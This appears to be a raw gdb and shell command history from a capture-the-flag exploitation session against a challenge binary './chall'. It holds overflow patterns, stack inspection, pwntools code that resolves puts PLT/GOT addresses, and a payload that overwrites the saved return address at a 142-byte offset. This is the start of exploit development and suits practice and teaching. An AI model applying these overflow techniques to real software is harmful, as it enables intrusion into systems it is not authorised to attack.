exit
break read
run < pattern.bin
finish
exit
break read
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
c
exit
break read
r
c
exit
exiy
exit
r < payload.bin
info registers rip
exit
r < payload.bin
x/4gx $rsp
x/20bx $rsp
exit
r < /tmp/expl
x/gx $rsp
checksec --file=./chall
python3 - <<'PY'
from pwn import ELF
e = ELF('./chall')
print("main:   ", hex(e.symbols['main']))
print("puts@plt:", hex(e.plt['puts']))
print("puts@got:", hex(e.got['puts']))
PY

exit
r < /tmp/expl_test
x/gx $rsp
x/gx $rsp-8
x/40bx $rsp-32
python3 - <<'PY'
from pwn import *
OFF = 142
marker_rip = 0x2222222222222222
payload = b"A"*OFF + p64(marker_rip)
open("/tmp/expl_verify","wb").write(payload)
print("wrote /tmp/expl_verify len", len(payload))
PY

# Then in gdb:
# (gdb) r < /tmp/expl_verify
# (gdb) x/gx $rsp-8    # should show saved RBP (garbage)
# (gdb) x/gx $rsp      # should show 0x2222222222222222 (saved RIP)

exit
r < /tmp/expl_verify 
x/gx $rsp-8
x/gx $rsp
exit
run < /tmp/wake_payload
set pagination off
bt full
info registers
x/4gx $rsp
x/64bx $rsp
x/8gx 0x404010
disassemble 0x4011f1, 0x4011f1+8

info registers
x/4gx $rsp
x/64bx $rsp
x/8gx 0x404010
disassemble 0x4011f1, 0x4011f1+8
exit
run < /tmp/wake_payload
set pagination off
bt full
info registers
x/8gx $rsp
x/128bx $rsp
x/8gx 0x404010
disassemble 0x4011f1,0x4011f1+16
exit
run
set pagination off
exit
exit
